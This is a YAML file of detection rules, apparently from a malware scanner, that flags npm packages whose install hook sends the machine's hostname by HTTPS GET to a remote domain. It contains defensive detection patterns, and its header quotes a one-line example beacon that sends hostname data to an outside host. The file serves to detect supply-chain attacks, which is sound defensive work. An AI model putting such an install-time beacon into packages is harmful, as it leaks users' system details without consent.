# Install-time hostname callback over a plain GET to a fixed domain.
#
# The dependency-confusion canary shape: a lifecycle hook runs a local Node
# script that reads os.hostname(), URL-encodes it into a query string and
# issues one HTTPS GET to a hardcoded host. The IP-literal, Base64 and POST
# forms in hostname-query-beacon.yaml and disclosed-profile-beacon.yaml do not
# match a plain domain. The hook declaration, the host read and the request
# usually live in different files of one package, so the evidence meets at
# archive scope.
#
# Worked example: signup-lib@99.99.99 (`postinstall.js`:
# `https.get('https://h1.cx/log?depconf=' + encodeURIComponent(os.hostname()))`).
defaults:
  platforms: [unix, windows]
  for: [npm, tar, package.json, javascript, typescript]
  attack: T1195.002,T1041

composite_rules:
  - id: npm-depconf-hostname-get-beacon
    desc: Depconf hook GETs hostname to remote host
    crit: hostile
    conf: 0.97
    scope: archive
    all:
      - id: metadata/package/description/disclosure::desc-dependency-confusion
      - id: metadata/package/scripts/entrypoint::node-install-hook-local-script
      - id: micro-behaviors/os/sysinfo/hostname/query::os-hostname-call
      - id: micro-behaviors/communications/http/request/get::node-http-client-get

  # Same install-time hostname GET without a dependency-confusion disclosure.
  # Telemetry-style install hooks can share this shape, so it stays suspicious.
  - id: npm-install-hook-hostname-get-beacon
    desc: Install hook GETs hostname to remote host
    crit: suspicious
    conf: 0.9
    scope: archive
    all:
      - id: metadata/package/scripts/entrypoint::node-install-hook-local-script
      - id: micro-behaviors/os/sysinfo/hostname/query::os-hostname-call
      - id: micro-behaviors/communications/http/request/get::node-http-client-get
      - id: micro-behaviors/data/encode/url::encode-uri-component-call
